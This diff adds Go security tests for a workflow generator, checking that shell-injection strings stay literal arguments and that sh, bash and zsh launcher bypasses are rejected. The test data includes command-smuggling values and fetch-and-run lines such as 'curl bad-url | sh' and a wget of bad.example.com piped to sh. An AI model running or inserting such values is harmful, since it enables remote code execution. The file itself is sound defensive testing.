@@ -72,3 +72,78 @@ func TestGenerateWorkflowUnknownModelDoesNotUseShell(t *testing.T) {
 		t.Fatalf("manifest=%s", manifest)
 	}
 }
+
+// TestGenerateWorkflowInjectionShapedModelIsArgvSafe covers acceptance criterion 2 of SEC-006:
+// injection-shaped model strings must be passed as literal argv args, never evaluated by a shell.
+func TestGenerateWorkflowInjectionShapedModelIsArgvSafe(t *testing.T) {
+	maliciousModels := []string{
+		"$(touch /tmp/pwn)",
+		"`id`",
+		"model; curl bad-url | sh",
+		"model && wget http://bad.example.com/x -O /tmp/x && sh /tmp/x",
+	}
+	for _, model := range maliciousModels {
+		manifest, _, err := GenerateWorkflow(WorkflowRequest{
+			Name:  "train-custom",
+			Model: model,
+		})
+		if err != nil {
+			t.Fatalf("model=%q: unexpected error: %v", model, err)
+		}
+		// Must use echo (argv-safe), never sh/bash/shell launcher
+		if strings.Contains(manifest, "/bin/sh") || strings.Contains(manifest, "bash -c") {
+			t.Fatalf("model=%q: manifest uses shell launcher:\n%s", model, manifest)
+		}
+		if !strings.Contains(manifest, "- echo") {
+			t.Fatalf("model=%q: manifest missing expected echo command:\n%s", model, manifest)
+		}
+	}
+}
+
+// TestGenerateWorkflowRejectsShellLauncherArgsBypass verifies split command/args
+// shell launcher bypass attempts (e.g. command=["/bin/sh"], args=["-c", "..."]) are blocked.
+func TestGenerateWorkflowRejectsShellLauncherArgsBypass(t *testing.T) {
+	_, _, err := GenerateWorkflow(WorkflowRequest{
+		Name:    "train",
+		Image:   "python:3.11-slim",
+		Command: []string{"/bin/sh"},
+		Args:    []string{"-c", "curl bad-url | sh"},
+	})
+	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+		t.Fatalf("expected error for shell launcher bypass, got: %v", err)
+	}
+
+	_, _, err = GenerateWorkflow(WorkflowRequest{
+		Name:    "train",
+		Image:   "python:3.11-slim",
+		Command: []string{"bash"},
+		Args:    []string{"-c", "curl bad-url | sh"},
+	})
+	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+		t.Fatalf("expected error for shell launcher bypass, got: %v", err)
+	}
+
+	// Test extra execution flag variants (-lc, -ec, -elc, -xc) requested in review
+	extraFlags := []string{"-lc", "-ec", "-elc", "-xc"}
+	for _, flag := range extraFlags {
+		_, _, err = GenerateWorkflow(WorkflowRequest{
+			Name:    "train",
+			Image:   "python:3.11-slim",
+			Command: []string{"/bin/sh"},
+			Args:    []string{flag, "curl bad-url | sh"},
+		})
+		if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+			t.Fatalf("expected error for shell launcher bypass flag %q, got: %v", flag, err)
+		}
+
+		_, _, err = GenerateWorkflow(WorkflowRequest{
+			Name:    "train",
+			Image:   "python:3.11-slim",
+			Command: []string{"zsh", flag},
+			Args:    []string{"curl bad-url | sh"},
+		})
+		if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+			t.Fatalf("expected error for shell launcher bypass flag %q in command, got: %v", flag, err)
+		}
+	}
+}
